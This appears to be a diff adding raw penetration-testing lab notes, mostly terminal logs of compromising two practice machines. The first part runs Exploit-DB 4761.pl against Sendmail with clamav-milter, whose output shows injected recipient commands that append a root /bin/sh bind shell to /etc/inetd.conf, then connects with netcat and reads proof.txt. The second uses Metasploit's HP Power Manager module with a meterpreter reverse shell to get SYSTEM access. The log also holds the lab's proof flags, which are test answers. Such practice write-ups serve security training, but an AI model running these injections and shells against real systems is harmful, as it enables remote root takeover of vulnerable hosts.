@@ -1,0 +1,440 @@
+                                                                                                                                                                            
+┌──(kali㉿kali)-[~/clamav]
+└─$ sudo nmap -sV -sC -A -Pn -sT 192.168.124.42 -p 1-65300
+[sudo] password for kali: 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-17 09:02 CEST
+Nmap scan report for 192.168.124.42
+Host is up (0.041s latency).
+Not shown: 65293 closed tcp ports (conn-refused)
+PORT      STATE SERVICE     VERSION
+22/tcp    open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
+|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
+25/tcp    open  smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
+| smtp-commands: localhost.localdomain Hello [192.168.45.162], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
+|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
+80/tcp    open  http        Apache httpd 1.3.33 ((Debian GNU/Linux))
+|_http-title: Ph33r
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/1.3.33 (Debian GNU/Linux)
+139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+199/tcp   open  smux        Linux SNMP multiplexer
+445/tcp   open  netbios-ssn Samba smbd 3.0.14a-Debian (workgroup: WORKGROUP)
+60000/tcp open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
+|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.95%E=4%D=6/17%OT=22%CT=1%CU=35457%PV=Y%DS=4%DC=T%G=Y%TM=6851135
+OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=BE%GCD=1%ISR=CD%TI=Z%CI=Z%II=I%TS=A)SEQ(S
+OS:P=C6%GCD=1%ISR=CB%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=C8%GCD=1%ISR=C6%TI=Z%CI=Z%I
+OS:I=I%TS=A)SEQ(SP=CA%GCD=1%ISR=CC%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=CB%GCD=1%ISR=
+OS:D1%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M578ST11NW0%O2=M578ST11NW0%O3=M578NNT11NW0
+OS:%O4=M578ST11NW0%O5=M578ST11NW0%O6=M578ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W
+OS:4=16A0%W5=16A0%W6=16A0)ECN(R=Y%DF=Y%T=40%W=16D0%O=M578NNSNW0%CC=N%Q=)T1(
+OS:R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S
+OS:=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R
+OS:=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%
+OS:UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 4 hops
+Service Info: Host: localhost.localdomain; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: share (dangerous)
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.14a-Debian)
+|   NetBIOS computer name: 
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2025-06-17T07:02:25-04:00
+|_smb2-time: Protocol negotiation failed (SMB2)
+|_clock-skew: mean: 5h58m56s, deviation: 2h49m43s, median: 3h58m55s
+|_nbstat: NetBIOS name: 0XBABE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+
+TRACEROUTE (using proto 1/icmp)
+HOP RTT      ADDRESS
+1   39.73 ms 192.168.45.1
+2   40.15 ms 192.168.45.254
+3   40.17 ms 192.168.251.1
+4   40.53 ms 192.168.124.42
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 73.91 seconds
+  
+I got exploit Sendmail 8.13.4/8.13.4/ which is exploit 4761.pl from exploit db
+                                                                                                                                                                          
+┌──(kali㉿kali)-[~/clamav]
+└─$ cp /home/kali/Downloads/4761.pl .        
+                                                                                                                                                                            
+┌──(kali㉿kali)-[~/clamav]
+└─$ ls
+4761.pl
+                                                                                                                                                                            
+┌──(kali㉿kali)-[~/clamav]
+└─$ chmod +x 4761.pl                 
+                                                                                                                                                                            
+┌──(kali㉿kali)-[~/clamav]
+└─$ ls
+4761.pl
+                                                                                                             
+┌──(kali㉿kali)-[~/clamav]
+└─$ perl 4761.pl 192.168.124.42
+Sendmail w/ clamav-milter Remote Root Exploit
+Copyright (C) 2007 Eliteboy
+Attacking 192.168.124.42...
+220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3; Tue, 17 Jun 2025 07:17:44 -0400; (No UCE/UBE) logging access from: [192.168.45.162](FAIL)-[192.168.45.162]
+250-localhost.localdomain Hello [192.168.45.162], pleased to meet you
+250-ENHANCEDSTATUSCODES
+250-PIPELINING
+250-EXPN
+250-VERB
+250-8BITMIME
+250-SIZE
+250-DSN
+250-ETRN
+250-DELIVERBY
+250 HELP
+250 2.1.0 <>... Sender ok
+250 2.1.5 <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf">... Recipient ok
+250 2.1.5 <nobody+"|/etc/init.d/inetd restart">... Recipient ok
+354 Enter mail, end with "." on a line by itself
+250 2.0.0 55HBHiY7004064 Message accepted for delivery
+221 2.0.0 localhost.localdomain closing connection
+                                                                                                                                                                            
+┌──(kali㉿kali)-[~/clamav]
+└─$ nc -nvlp 192.168.124.42 31337                        
+listening on [any] 192 ...
+^C
+                                                                                                                                                                            
+┌──(kali㉿kali)-[~/clamav]
+└─$ nc -nv 192.168.124.42 31337 
+(UNKNOWN) [192.168.124.42] 31337 (?) open
+id
+uid=0(root) gid=0(root) groups=0(root)
+whoami
+root
+hostname
+0xbabe.local
+ls
+bin
+boot
+cdrom
+dev
+etc
+home
+initrd
+initrd.img
+initrd.img.old
+lib
+lost+found
+media
+mnt
+opt
+proc
+root
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+cd /home 
+ls
+ryu
+cd ryu
+ls
+cd /root
+ls
+dbootstrap_settings
+install-report.template
+proof.txt
+cat proof.txt
+5d80ba7c8549db6639d03f793693406c
+
+
+#Kevin
+
+──(kali㉿kali)-[~/kevin]
+└─$ sudo nmap -sV -sC -A -Pn -sT 192.168.124.45 -p 1-65300
+[sudo] password for kali: 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-17 09:35 CEST
+Nmap scan report for 192.168.124.45
+Host is up (0.046s latency).
+Not shown: 65288 closed tcp ports (conn-refused)
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          GoAhead WebServer
+|_http-server-header: GoAhead-Webs
+| http-title: HP Power Manager
+|_Requested resource was http://192.168.124.45/index.asp
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds  Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  ms-wbt-server Microsoft Terminal Service
+|_ssl-date: 2025-06-17T07:36:15+00:00; -1m03s from scanner time.
+| ssl-cert: Subject: commonName=kevin
+| Not valid before: 2025-06-16T07:28:41
+|_Not valid after:  2025-12-16T07:28:41
+| rdp-ntlm-info: 
+|   Target_Name: KEVIN
+|   NetBIOS_Domain_Name: KEVIN
+|   NetBIOS_Computer_Name: KEVIN
+|   DNS_Domain_Name: kevin
+|   DNS_Computer_Name: kevin
+|   Product_Version: 6.1.7600
+|_  System_Time: 2025-06-17T07:36:07+00:00
+3573/tcp  open  tag-ups-1?
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49158/tcp open  msrpc         Microsoft Windows RPC
+49159/tcp open  msrpc         Microsoft Windows RPC
+Device type: general purpose
+Running: Microsoft Windows 7|2008|8.1
+OS CPE: cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1
+OS details: Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1
+Network Distance: 4 hops
+Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+From port 80, I saw a web application running running HP Power Manager. I decided to search for the exploit.
+Host script results:
+| smb-os-discovery: 
+|   OS: Windows 7 Ultimate N 7600 (Windows 7 Ultimate N 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::-
+|   Computer name: kevin
+|   NetBIOS computer name: KEVIN\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2025-06-17T00:36:07-07:00
+|_nbstat: NetBIOS name: KEVIN, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:9e:68:b7 (VMware)
+|_clock-skew: mean: 1h22m57s, deviation: 3h07m50s, median: -1m03s
+| smb2-time: 
+|   date: 2025-06-17T07:36:07
+|_  start_date: 2025-06-17T07:29:30
+| smb2-security-mode: 
+|   2:1:0: 
+|_    Message signing enabled but not required
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+
+TRACEROUTE (using proto 1/icmp)
+HOP RTT      ADDRESS
+1   41.90 ms 192.168.45.1
+2   41.85 ms 192.168.45.254
+3   41.93 ms 192.168.251.1
+4   42.05 ms 192.168.124.45
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 116.37 seconds
+                                                                                                                                                                            
+┌──(kali㉿kali)-[~/kevin]
+└─$ nano 18015.rb                                    
+                                                                                                                                                                            
+┌──(kali㉿kali)-[~/kevin]
+└─$ ./18015.rb              
+: not found 4: 
+: not found 11: 
+./18015.rb: 12: require: not found
+: not found 13: 
+: No such file: cannot open Msf::Exploit::Remote
+./18015.rb: 15: Rank: not found
+: not found 16: 
+./18015.rb: 17: include: not found
+./18015.rb: 18: include: not found
+: not found 19: 
+./18015.rb: 20: Syntax error: "(" unexpected
+                                                                                                                                                                            
+┌──(kali㉿kali)-[~/kevin]
+└─$ ruby 18015.rb
+<internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb>:136:in `require': cannot load such file -- msf/core (LoadError)
+        from <internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb>:136:in `require'
+        from 18015.rb:12:in `<main>'
+                             msf6 exploit(windows/http/hp_power_manager_filename) > exit
+                                                                                                                                                                            
+┌──(kali㉿kali)-[~/kevin]
+└─$ sudo msfconsole -q
+[*] Starting persistent handler(s)...
+msf6 > use exploit/windows/http/hp_power_manager_filename
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/http/hp_power_manager_filename) > show options
+
+Module options (exploit/windows/http/hp_power_manager_filename):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT    80               yes       The target port (TCP)
+   SSL      false            no        Negotiate SSL/TLS for outgoing connections
+   VHOST                     no        HTTP server virtual host
+
+
+msf6 exploit(windows/http/hp_power_manager_filename) > set lhost 192.168.45.162
+lhost => 192.168.45.162
+msf6 exploit(windows/http/hp_power_manager_filename) > show options
+
+Module options (exploit/windows/http/hp_power_manager_filename):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS   192.168.124.45   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT    80               yes       The target port (TCP)
+   SSL      false            no        Negotiate SSL/TLS for outgoing connections
+   VHOST                     no        HTTP server virtual host
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.45.162   yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows XP SP3 / Win Server 2003 SP0
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/http/hp_power_manager_filename) > exploit
+[*] Started reverse TCP handler on 192.168.45.162:4444 
+[*] Generating payload...
+[*] Trying target Windows XP SP3 / Win Server 2003 SP0...
+[*] Payload sent! Go grab a coffee, the CPU is gonna work hard for you! :)
+[*] Exploit completed, but no session was created.
+msf6 exploit(windows/http/hp_power_manager_filename) > set lport 80
+lport => 80
+msf6 exploit(windows/http/hp_power_manager_filename) > show options
+
+Module options (exploit/windows/http/hp_power_manager_filename):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS   192.168.124.45   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT    80               yes       The target port (TCP)
+   SSL      false            no        Negotiate SSL/TLS for outgoing connections
+   VHOST                     no        HTTP server virtual host
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.45.162   yes       The listen address (an interface may be specified)
+   LPORT     80               yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows XP SP3 / Win Server 2003 SP0
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/http/hp_power_manager_filename) > exploit
+[*] Started reverse TCP handler on 192.168.45.162:80 
+[*] Generating payload...
+[*] Trying target Windows XP SP3 / Win Server 2003 SP0...
+[*] Sending stage (177734 bytes) to 192.168.124.45
+[*] Meterpreter session 1 opened (192.168.45.162:80 -> 192.168.124.45:49168) at 2025-06-17 10:54:30 +0200
+[*] Payload sent! Go grab a coffee, the CPU is gonna work hard for you! :)
+
+meterpreter > whoami
+[-] Unknown command: whoami. Run the help command for more details.
+meterpreter > shell
+Process 576 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>hostname
+hostname
+kevin
+
+C:\Windows\system32>cd ..
+cd ..
+
+C:\Windows>cd ..
+cd ..
+
+C:\>cd users
+cd users
+
+C:\Users>ls
+ls
+'ls' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Users>ir
+ir
+'ir' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Users>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A451-A4B1
+
+ Directory of C:\Users
+
+03/05/2010  01:26 AM    <DIR>          .
+03/05/2010  01:26 AM    <DIR>          ..
+03/05/2010  01:26 AM    <DIR>          Administrator
+10/03/2011  05:59 AM    <DIR>          kevin
+07/13/2009  09:08 PM    <DIR>          Public
+               0 File(s)              0 bytes
+               5 Dir(s)   1,782,317,056 bytes free
+
+C:\Users>cd Administrator
+cd Administrator
+
+C:\Users\Administrator>cd Desktop
+cd Desktop
+
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A451-A4B1
+
+ Directory of C:\Users\Administrator\Desktop
+
+07/09/2020  07:24 PM    <DIR>          .
+07/09/2020  07:24 PM    <DIR>          ..
+06/17/2025  01:43 AM                34 proof.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   1,782,317,056 bytes free
+
+C:\Users\Administrator\Desktop>type proof.txt
+type proof.txt
+67771a413f6c30edaa609099fec12b26
+
+C:\Users\Administrator\Desktop>
+
+
